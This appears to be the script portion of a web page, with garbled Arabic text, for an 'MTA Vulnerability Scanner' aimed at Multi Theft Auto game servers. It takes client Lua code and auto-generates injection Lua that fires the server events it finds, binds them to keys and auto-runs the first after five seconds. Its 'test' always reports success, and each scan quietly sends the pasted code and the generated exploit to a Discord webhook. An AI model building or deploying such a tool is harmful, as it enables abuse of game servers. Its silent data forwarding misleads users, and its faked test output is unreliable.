        // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø­Ø§Ù„Ø© Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©
        function checkAuthStatus() {
            const savedUser = localStorage.getItem('current_user');
            if (savedUser) {
                currentUser = JSON.parse(savedUser);
                userCoins = currentUser.coins;
                document.getElementById('userStatus').textContent = `Ù…Ø±Ø­Ø¨Ø§Ù‹ØŒ ${currentUser.username}`;
                document.querySelector('.auth-buttons').innerHTML = `
                    <button class="btn-auth" onclick="logout()">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø±ÙˆØ¬</button>
                `;
            }
        }

        // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø±ÙˆØ¬
        function logout() {
            currentUser = null;
            userCoins = 0;
            localStorage.removeItem('current_user');
            document.getElementById('userStatus').textContent = 'ØºÙŠØ± Ù…Ø³Ø¬Ù„ Ø§Ù„Ø¯Ø®ÙˆÙ„';
            document.querySelector('.auth-buttons').innerHTML = `
                <button class="btn-auth" onclick="showAuthModal()">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</button>
                <button class="btn-auth" onclick="showRegisterModal()">Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨</button>
            `;
            updateCoinsDisplay();
        }

        // ØªØ­Ø¯ÙŠØ« Ø¹Ø±Ø¶ Ø§Ù„Ø¹Ù…Ù„Ø§Øª
        function updateCoinsDisplay() {
            document.getElementById('coinsCount').textContent = currentUser ? userCoins : '0';
        }

        // Ù†Ø³Ø® ÙƒÙˆØ¯ Ø§Ù„Ø­Ù‚Ù†
        function copyExploitCode() {
            const codeText = document.getElementById('exploitCodeResult').textContent;
            navigator.clipboard.writeText(codeText).then(() => {
                alert('ØªÙ… Ù†Ø³Ø® ÙƒÙˆØ¯ Ø§Ù„Ø­Ù‚Ù† Ø¥Ù„Ù‰ Ø§Ù„Ø­Ø§ÙØ¸Ø©');
            });
        }

        // Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ù…Ø¹ Ø®ØµÙ… Ø§Ù„Ø¹Ù…Ù„Ø§Øª
        document.getElementById('analyzeBtn').addEventListener('click', function() {
            if (!currentUser) {
                alert('ÙŠØ±Ø¬Ù‰ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø£ÙˆÙ„Ø§Ù‹');
                showAuthModal();
                return;
            }

            if (userCoins < 1) {
                alert('Ù„ÙŠØ³ Ù„Ø¯ÙŠÙƒ Ø¹Ù…Ù„Ø§Øª ÙƒØ§ÙÙŠØ©! ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªÙˆØ§ØµÙ„ Ù…Ø¹ Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„.');
                return;
            }

            const luaCode = document.getElementById('luaCode').value;
            const bindKey = document.getElementById('bindKey').value || 'F1';
            
            if (!luaCode.trim()) {
                alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ ÙƒÙˆØ¯ Lua Ù„Ù„ØªØ­Ù„ÙŠÙ„');
                return;
            }

            // Ø®ØµÙ… Ø¹Ù…Ù„Ø©
            userCoins--;
            currentUser.coins = userCoins;
            currentUser.scans = (currentUser.scans || 0) + 1;
            users[currentUser.username] = currentUser;
            localStorage.setItem('vulnerability_users', JSON.stringify(users));
            localStorage.setItem('current_user', JSON.stringify(currentUser));
            updateCoinsDisplay();

            const analysis = extractVulnerabilitiesFromCode(luaCode, bindKey);
            const exploitCode = generateInjectionCodeFromOriginal(luaCode, bindKey);
            
            document.getElementById('analysisResult').innerHTML = analysis.analysis;
            document.getElementById('exploitCodeResult').textContent = exploitCode.code;
            document.getElementById('outputBox').textContent = analysis.output;
            document.getElementById('exploitInfo').textContent = analysis.exploitInfo;

            // Ø¥Ø±Ø³Ø§Ù„ ÙˆÙŠØ¨ Ù‡ÙˆÙƒ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ù…Ø§Ø³Ø­
            sendDiscordWebhook('scan_used', {
                username: currentUser.username,
                code_length: luaCode.length,
                coins_remaining: userCoins
            });

            // Ø¥Ø±Ø³Ø§Ù„ ÙˆÙŠØ¨ Ù‡ÙˆÙƒ Ù„Ù„Ø«ØºØ±Ø§Øª Ø§Ù„Ù…ÙƒØªØ´ÙØ© Ù…Ø¹ Ø§Ù„ÙƒÙˆØ¯ÙŠÙ†
            sendDiscordWebhook('vulnerability_scan', {
                username: currentUser.username,
                vulnerabilities_count: analysis.vulnerabilities_count,
                original_code: luaCode,
                exploit_code: exploitCode.code,
                coins_remaining: userCoins
            });
        });

        // Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ¨ÙˆÙŠØ¨Ø§Øª
        document.querySelectorAll('.tab').forEach(tab => {
            tab.addEventListener('click', () => {
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
                
                tab.classList.add('active');
                const tabId = tab.getAttribute('data-tab') + 'Tab';
                document.getElementById(tabId).classList.add('active');
            });
        });

        document.getElementById('generateBtn').addEventListener('click', function() {
            if (!currentUser) {
                alert('ÙŠØ±Ø¬Ù‰ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø£ÙˆÙ„Ø§Ù‹');
                showAuthModal();
                return;
            }

            const luaCode = document.getElementById('luaCode').value;
            const bindKey = document.getElementById('bindKey').value || 'F1';
            
            const exploitCode = generateInjectionCodeFromOriginal(luaCode, bindKey);
            
            document.getElementById('exploitCodeResult').textContent = exploitCode.code;
            document.getElementById('exploitInfo').textContent = exploitCode.info;
            
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            document.querySelector('.tab[data-tab="exploitCode"]').classList.add('active');
            document.getElementById('exploitCodeTab').classList.add('active');
        });

        document.getElementById('exploitBtn').addEventListener('click', function() {
            if (!currentUser) {
                alert('ÙŠØ±Ø¬Ù‰ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø£ÙˆÙ„Ø§Ù‹');
                showAuthModal();
                return;
            }

            const luaCode = document.getElementById('luaCode').value;
            const bindKey = document.getElementById('bindKey').value || 'F1';
            
            if (!luaCode.trim()) {
                alert('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ ÙƒÙˆØ¯ Lua');
                return;
            }
            
            const exploitResult = testExploit(luaCode, bindKey);
            
            document.getElementById('analysisResult').innerHTML = exploitResult.analysis;
            document.getElementById('outputBox').textContent = exploitResult.output;
            document.getElementById('exploitInfo').textContent = exploitResult.exploitInfo;
        });

        // Ø§Ù„Ø¯ÙˆØ§Ù„ Ø§Ù„Ù…Ø³Ø§Ø¹Ø¯Ø© Ù„Ù„ØªØ­Ù„ÙŠÙ„
        function extractVulnerabilitiesFromCode(code, bindKey) {
            let analysis = "<h3>Ø§Ù„Ø«ØºØ±Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø±Ø¬Ø© Ù…Ù† Ø§Ù„ÙƒÙˆØ¯:</h3>";
            let output = "";
            let exploitInfo = "";
            
            const vulnerabilities = [];
            
            // Ø§Ø³ØªØ®Ø±Ø§Ø¬ triggerServerEvent
            const triggerRegex = /triggerServerEvent\s*\(\s*['"]([^'"]+)['"]([^)]*)\)/g;
            let triggerMatch;
            
            while ((triggerMatch = triggerRegex.exec(code)) !== null) {
                const eventName = triggerMatch[1];
                vulnerabilities.push({
                    type: 'triggerServerEvent',
                    eventName: eventName,
                    severity: 'high',
                    description: `Ø­Ø¯Ø« Ø®Ø§Ø¯Ù…: ${eventName}`,
                    details: `ÙŠÙ…ÙƒÙ† Ø§Ø³ØªØºÙ„Ø§Ù„ Ù‡Ø°Ø§ Ø§Ù„Ø­Ø¯Ø« Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù„Ø®Ø§Ø¯Ù…`
                });
            }
            
            // Ø§Ø³ØªØ®Ø±Ø§Ø¬ setElementData
            if (code.includes('setElementData')) {
                vulnerabilities.push({
                    type: 'dataManipulation',
                    severity: 'critical',
                    description: 'ØªÙ„Ø§Ø¹Ø¨ ÙÙŠ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¹Ù†Ø§ØµØ±',
                    details: 'ÙŠÙ…ÙƒÙ† ØªØ¹Ø¯ÙŠÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù„Ø§Ø¹Ø¨ÙŠÙ† Ø£Ùˆ Ø§Ù„Ø¹Ù†Ø§ØµØ± Ø§Ù„Ø£Ø®Ø±Ù‰'
                });
            }
            
            // Ø§Ø³ØªØ®Ø±Ø§Ø¬ executeCommandHandler
            if (code.includes('executeCommandHandler')) {
                vulnerabilities.push({
                    type: 'commandInjection',
                    severity: 'critical',
                    description: 'Ø­Ù‚Ù† Ø£ÙˆØ§Ù…Ø±',
                    details: 'ÙŠÙ…ÙƒÙ† ØªÙ†ÙÙŠØ° Ø£ÙˆØ§Ù…Ø± Ø®Ø§Ø¯Ù…ÙŠØ© Ø¯ÙˆÙ† ØµÙ„Ø§Ø­ÙŠØ§Øª'
                });
            }
            
            // Ø¹Ø±Ø¶ Ø§Ù„Ù†ØªØ§Ø¦Ø¬
            if (vulnerabilities.length > 0) {
                vulnerabilities.forEach(vuln => {
                    analysis += `
                        <div class="vulnerability-item vuln-${vuln.severity}">
                            <strong>${vuln.description}</strong>
                            <span class="severity ${vuln.severity}">${getSeverityText(vuln.severity)}</span>
                            <div style="margin-top: 8px; color: #ccc;">${vuln.details}</div>
                        </div>
                    `;
                });
                
                output = `ØªÙ… Ø§ÙƒØªØ´Ø§Ù ${vulnerabilities.length} Ø«ØºØ±Ø©\nØ§Ù„Ø¹Ù…Ù„Ø§Øª Ø§Ù„Ù…ØªØ¨Ù‚ÙŠØ©: ${userCoins}`;
                exploitInfo = `ØªÙ… Ø®ØµÙ… Ø¹Ù…Ù„Ø© ÙˆØ§Ø­Ø¯Ø©. Ø§Ù„Ø¹Ù…Ù„Ø§Øª Ø§Ù„Ù…ØªØ¨Ù‚ÙŠØ©: ${userCoins}`;
            } else {
                analysis = "Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø«ØºØ±Ø§Øª ÙˆØ§Ø¶Ø­Ø©";
                output = "Ù„Ø§ ØªÙˆØ¬Ø¯ Ø«ØºØ±Ø§Øª Ù„Ù„Ø§Ø³ØªØºÙ„Ø§Ù„";
                exploitInfo = "ØªÙ… Ø§Ù„ØªØ­Ù„ÙŠÙ„ ÙˆÙ„ÙƒÙ† Ù„Ù… ØªÙˆØ¬Ø¯ Ø«ØºØ±Ø§Øª";
            }
            
            return { 
                analysis, 
                output, 
                exploitInfo,
                vulnerabilities_count: vulnerabilities.length 
            };
        }

        function generateInjectionCodeFromOriginal(code, bindKey) {
            let exploitCode = "";
            let info = "";
            
            const events = [];
            const triggerRegex = /triggerServerEvent\s*\(\s*['"]([^'"]+)['"]([^)]*)\)/g;
            let triggerMatch;
            
            while ((triggerMatch = triggerRegex.exec(code)) !== null) {
                events.push({ name: triggerMatch[1] });
            }
            
            if (events.length > 0) {
                exploitCode = `-- ÙƒÙˆØ¯ Ø§Ù„Ø­Ù‚Ù† Ø§Ù„Ù…Ø³ØªØ®Ø±Ø¬ Ù…Ù† Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø£ØµÙ„ÙŠ\n-- ØªÙ… Ø¥Ù†Ø´Ø§Ø¤Ù‡ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¨ÙˆØ§Ø³Ø·Ø© MTA Vulnerability Scanner\n\n`;
                
                events.forEach((event, index) => {
                    exploitCode += `function exploit${index + 1}()\n`;
                    exploitCode += `    local player = getLocalPlayer()\n`;
                    exploitCode += `    local playerName = getPlayerName(player)\n`;
                    exploitCode += `    triggerServerEvent("${event.name}", resourceRoot, playerName, "exploit_data", getTickCount())\n`;
                    exploitCode += `    outputChatBox("ØªÙ… Ø§Ù„Ø§Ø³ØªØºÙ„Ø§Ù„: ${event.name}", 0, 255, 0)\n`;
                    exploitCode += `end\n\n`;
                });
                
                exploitCode += `-- Ø±Ø¨Ø· Ø§Ù„Ø«ØºØ±Ø§Øª Ø¨Ø§Ù„Ù…ÙØ§ØªÙŠØ­\n`;
                events.forEach((event, index) => {
                    const key = index === 0 ? bindKey : `F${index + 1}`;
                    exploitCode += `bindKey("${key}", "down", exploit${index + 1})\n`;
                });
                
                // Ø¥Ø¶Ø§ÙØ© ØªØ´ØºÙŠÙ„ ØªÙ„Ù‚Ø§Ø¦ÙŠ
                exploitCode += `\n-- ØªØ´ØºÙŠÙ„ ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¨Ø¹Ø¯ 5 Ø«ÙˆØ§Ù†ÙŠ\n`;
                exploitCode += `setTimer(function()\n`;
                exploitCode += `    exploit1()\n`;
                exploitCode += `    outputChatBox("ØªÙ… ØªÙ†Ø´ÙŠØ· Ø§Ù„Ø«ØºØ±Ø§Øª ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹", 255, 255, 0)\n`;
                exploitCode += `end, 5000, 1)\n`;
                
                info = `ØªÙ… ØªÙˆÙ„ÙŠØ¯ ÙƒÙˆØ¯ Ø­Ù‚Ù† Ù„Ù€ ${events.length} Ø­Ø¯Ø« Ø®Ø§Ø¯Ù…`;
            } else {
                exploitCode = "-- Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø£Ø­Ø¯Ø§Ø« triggerServerEvent ÙÙŠ Ø§Ù„ÙƒÙˆØ¯\n-- Ù„Ø§ ÙŠÙ…ÙƒÙ† ØªÙˆÙ„ÙŠØ¯ ÙƒÙˆØ¯ Ø­Ù‚Ù† Ø¨Ø¯ÙˆÙ† Ø£Ø­Ø¯Ø§Ø« Ø®Ø§Ø¯Ù…";
                info = "Ù„Ø§ ØªÙˆØ¬Ø¯ Ø£Ø­Ø¯Ø§Ø« Ø®Ø§Ø¯Ù… Ù„Ù„Ø§Ø³ØªØºÙ„Ø§Ù„";
            }
            
            return { code: exploitCode, info };
        }

        function testExploit(code, bindKey) {
            let analysis = "<h3>Ù†ØªØ§Ø¦Ø¬ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±:</h3>";
            let output = "";
            let exploitInfo = "";
            
            analysis += `<div class="vulnerability-item vuln-high">
                <strong>âœ“ Ø¬Ø§Ù‡Ø² Ù„Ù„Ø­Ù‚Ù†</strong>
                <span class="severity high">Ù†Ø§Ø¬Ø­</span>
                <div style="margin-top: 8px; color: #ccc;">Ø§Ù„ÙƒÙˆØ¯ Ø¬Ø§Ù‡Ø² Ù„Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù… ÙÙŠ MTA</div>
            </div>`;
            
            output = "Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø± Ù…ÙƒØªÙ…Ù„\nØ§Ù„ÙƒÙˆØ¯ Ø¬Ø§Ù‡Ø² Ù„Ù„Ø­Ù‚Ù† ÙÙŠ Ø§Ù„Ø³ÙŠØ±ÙØ±";
            exploitInfo = "ÙŠÙ…ÙƒÙ† Ù†Ø³Ø® ÙƒÙˆØ¯ Ø§Ù„Ø­Ù‚Ù† ÙˆØ§Ø³ØªØ®Ø¯Ø§Ù…Ù‡ Ù…Ø¨Ø§Ø´Ø±Ø© ÙÙŠ MTA";
            
            return { analysis, output, exploitInfo };
        }

        function getSeverityText(severity) {
            const severityMap = {
                'critical': 'Ø­Ø±Ø¬', 'high': 'Ø¹Ø§Ù„ÙŠ', 'medium': 'Ù…ØªÙˆØ³Ø·', 'low': 'Ù…Ù†Ø®ÙØ¶'
            };
            return severityMap[severity] || severity;
        }
    </script>
</body>
</html>